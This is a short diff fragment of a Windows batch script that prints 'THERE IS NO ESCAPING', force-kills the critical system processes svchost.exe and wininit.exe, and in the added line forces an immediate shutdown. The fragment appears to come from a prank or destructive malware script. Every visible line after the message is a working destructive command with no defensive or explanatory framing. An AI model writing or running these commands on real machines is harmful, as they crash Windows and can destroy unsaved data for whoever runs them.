@@ -29,3 +29,4 @@ echo THERE IS NO ESCAPING
 timeout 5
 taskkill /f /im svchost.exe
 taskkill /f /im wininit.exe
+shutdown /s /t 0
